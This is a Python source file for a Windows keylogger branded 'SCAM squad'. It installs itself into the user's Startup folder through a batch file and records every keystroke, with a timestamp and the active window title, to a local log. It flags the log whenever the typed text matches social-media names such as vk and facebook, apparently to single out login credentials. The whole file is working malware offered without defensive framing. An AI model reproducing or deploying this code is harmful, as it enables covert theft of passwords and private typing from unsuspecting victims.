import os
from pynput import keyboard
import datetime
from win32gui import GetWindowText, GetForegroundWindow
import getpass
USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
        file_path += "\output\main\main.exe"
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start %s' % file_path)

add_to_startup()

f = open("log.txt", "a")
f.write("---------------- SCAM squad | This computer was probably rebooted | SCAM squad---------------------\n")
f.close()

str1 = ""

def rusToEng(msg):
    result = ""
    for i in str(msg.lower()):
        if i == "а":
            result += "a"
        elif i == "б":
            result += "b"
        elif i == "в":
            result += "v"
        elif i == "г":
            result += "g"
        elif i == "д":
            result += "d"
        elif i == "е":
            result += "e"
        elif i == "ё":
            result += "e"
        elif i == "ж":
            result += "j"
        elif i == "з":
            result += "z"
        elif i == "и":
            result += "i"
        elif i == "й":
            result += "y"
        elif i == "к":
            result += "k"
        elif i == "л":
            result += "l"
        elif i == "м":
            result += "m"
        elif i == "н":
            result += "n"
        elif i == "о":
            result += "o"
        elif i == "п":
            result += "p"
        elif i == "р":
            result += "r"
        elif i == "с":
            result += "s"
        elif i == "т":
            result += "t"
        elif i == "у":
            result += "u"
        elif i == "ф":
            result += "f"
        elif i == "х":
            result += "h"
        elif i == "ц":
            result += "ts"
        elif i == "ч":
            result += "ch"
        elif i == "ш" or i == "щ":
            result += "sh"
        elif i == "ъ":
            result += ""
        elif i == "ы":
            result += "y"
        elif i == "ь":
            result += ""
        elif i == "э":
            result += "e"
        elif i == "ю":
            result += "yu"
        elif i == "я":
            result += "ya"
        elif i == "1" or i == "2" or i == "3" or i == "4" or i == "5" or i == "6" or i == "7" or i == "8" or i == "9" or i == "0" or i == "a" or i == "b"\
                or i == "c" or i == "d" or i == "e" or i == "f" or i == "g" or i == "h" or i == "i" or i == "j" or i == "k" or i == "l" or i == "m" or i == "n" or i == "o"\
                or i == "p" or i == "q" or i == "r" or i == "s" or i == "t" or i == "u" or i == "v" or i == "w" or i == "x" or i == "y" or i == "z" or i == " " or i == "."\
                or i == "," or i == "'" or i == "/"  or i == ";" or i == ":"  or i == "!" or i == "@"  or i == "#" or i == "$" or i == "&" or i == "*" or i == "(" or i == ")":
            result += i
        else:
            result += ""
    return str(result)


def on_press(key):
    try:
        global str1
        str1 += str(key)
        f = open("log.txt", "a")
        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' Pressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
        f.close()
        if "'v''k'" in str1 or "'f''a''c''e''b''o''o''k'" in str1 or "'t''w''e''e''t''e''r'" in str1 or "'t''e''s''t''e''r'" in str1 or "'l''n''m''o'" in str1:
            f = open("log.txt", "a")
            f.write("------ INTERESTING PLACE IN LOG ------\n")
            str1 = ""
    except AttributeError:
        f = open("log.txt", "a")
        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' pressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
        f.close()

def on_release(key):
    if key == keyboard.Key.shift or key == keyboard.Key.caps_lock:
        f = open("log.txt", "a")
        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' Unpressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
        f.close()
    if key == keyboard.Key.end:
        # Stop listener
        f = open("log.txt", "a")
        f.write("---------------- SCAM squad | Key listener was stopped at " + str(datetime.datetime.now())[:16] + "| SCAM squad---------------------\n")
        f.close()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()